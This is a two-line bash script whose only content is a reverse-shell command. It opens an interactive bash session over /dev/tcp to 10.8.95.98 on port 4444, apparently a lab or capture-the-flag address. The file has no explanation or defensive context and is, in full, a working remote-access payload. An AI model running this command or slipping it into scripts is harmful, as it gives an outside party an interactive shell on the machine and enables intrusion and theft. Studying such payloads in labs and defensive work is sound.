#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.8.95.98/4444 <&1'
